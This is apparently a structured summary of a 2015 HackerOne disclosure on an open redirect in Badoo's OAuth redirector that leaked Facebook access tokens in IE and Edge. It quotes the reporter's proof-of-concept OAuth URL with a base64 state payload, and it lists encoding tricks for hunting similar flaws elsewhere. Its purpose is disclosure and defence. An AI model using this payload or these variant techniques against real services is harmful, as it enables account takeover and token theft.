# Open Redirect in Badoo OAuth Redirector Enables Facebook Access Token Theft

## Metadata
- **Source:** HackerOne
- **Report:** 99435 | https://hackerone.com/reports/99435
- **Submitted:** 2015-11-13
- **Reporter:** stefanovettorazzi
- **Program:** Badoo
- **Bounty:** Not specified in report
- **Severity:** high
- **Vuln:** Open Redirect, OAuth Token Leakage, URL Parsing Inconsistency
- **CVEs:** None
- **Category:** uncategorised

## Summary
The redirector.phtml endpoint accepts a base64-encoded URL in the state parameter that is not properly validated, allowing attackers to craft URLs containing URL-encoded slashes (%2f) that parse differently in IE/Edge browsers. Facebook's OAuth implementation redirects with access tokens appended as fragments, causing them to be leaked to attacker-controlled domains.

## Attack scenario
1. Attacker identifies that Badoo uses external/redirector.phtml for OAuth authentication with Facebook
2. Attacker crafts a malicious URL using URL encoding (e.g., http://google.com%2f.badoo.com/) that bypasses validation in IE/Edge by exploiting browser-specific URL parsing behavior
3. Attacker base64-encodes the malicious URL and creates a Facebook OAuth dialog link with redirect_uri=badoo.com/external/redirector.phtml?state=[base64_payload]
4. Victim with existing Facebook-linked Badoo account clicks the malicious link
5. Facebook redirects to the attacker-controlled domain with the access_token in the URL fragment (#access_token=...)
6. Attacker captures the Facebook access token and can impersonate the user on Facebook

## Root cause
Multiple compounding issues: (1) Insufficient validation of the state parameter's base64-decoded URL; (2) Lack of URL parsing normalization across browsers; (3) Reliance on redirect_uri parameter without validating that fragments/parameters don't leak tokens to unintended domains; (4) Browser-specific interpretation of URL-encoded characters (%2f) in path separators creates inconsistent security boundaries

## Attacker mindset
An attacker recognizes that OAuth state parameters often contain URLs and that different browsers parse URLs inconsistently. By leveraging IE/Edge's lenient URL parsing, they can bypass basic URL validation while still redirecting to their domain. The attacker understands that Facebook includes access tokens in URL fragments and exploits this to steal OAuth tokens from a high-value target (Badoo user accounts).

## Defensive takeaways
- Implement strict whitelist-based validation for redirect URIs rather than blacklist approaches
- Normalize and canonicalize all URLs before validation to prevent encoding-based bypasses
- Never include sensitive tokens (access_token, refresh_token, session tokens) in URL fragments or query parameters
- Validate redirect URIs against a predefined whitelist stored server-side, not just regex patterns
- Use an allow-list of expected redirect domains and reject any encoded variations or subdomains
- Test OAuth implementations across multiple browsers, especially legacy ones like IE/Edge with different quirks
- Implement Content Security Policy (CSP) headers to restrict where credentials can be leaked
- Consider using private-use-address ranges or reserved TLDs in examples to prevent actual exploitation

## Variant hunting
Test other OAuth providers (Google, GitHub, etc.) with similar redirect manipulation techniques
Probe for similar patterns in other Badoo endpoints that handle URL parameters
Check if other special characters (%2e for dots, %3f for ?, %23 for #) can bypass validation
Test whether the vulnerability exists in newer browsers or if it's truly IE/Edge-specific
Investigate whether the base64 decoding itself could be bypassed with alternative encodings
Look for similar vulnerabilities in other platforms using external OAuth redirectors
Test if authentication state parameters in other services contain user-controlled URL data

## MITRE ATT&CK
- T1190
- T1598
- T1528
- T1539

## Notes
This vulnerability is particularly dangerous because it combines multiple weak points: URL parsing inconsistencies, inadequate state parameter validation, and OAuth token exposure. The restriction to IE/Edge is notable but still critical as these browsers were still in use at the time. The attacker doesn't need to compromise Badoo's servers directly; they simply exploit the application's trust in Facebook's redirect behavior combined with a validation bypass. The base64 encoding of the state parameter appears to be security theater and provided false confidence in the validation logic.

## Full report
<details><summary>Expand</summary>

__Description__

https://badoo.com/external/redirector.phtml is the endpoint used when authenticating using external services. This endpoint accepts the parameter _state_ which is a base64 encoded URL. The URL can't be like http://google.com/, but it can be like http://google.com%2f.badoo.com/ which is a valid URL for Internet Explorer (11 and Edge).
The problem is that Facebook redirects to the value of _redirect_uri_ even if the URL contains parameters (like `?parameter=value`), which is not the case with Google. So, for instance you can send the _access_token_ returned from Facebook to any domain that you control.

__Proof of concept__

1. Using a user that already linked the account with Facebook, go to https://www.facebook.com/v2.2/dialog/oauth?response_type=token&display=popup&client_id=107433747809&redirect_uri=https%3A%2F%2Fbadoo.com%2Fexternal%2Fredirector.phtml%3fstate%3daHR0cHM6Ly93d3cuZ29vZ2xlLmNvbSUyZi5iYWRvby5jb20v
2. You are redirected to https://www.google.com/.badoo.com/#access_token=[user_access_token]&expires_in=[number].

This issue is only reproducible on Internet Explorer 11 and Edge. I tested on both using a Windows 10 installation with latest updates.
I hope the explanation is clear. Please, let me know if you need more information or a better proof of concept.

</details>

---
*Analysed by Claude on 2026-05-24*
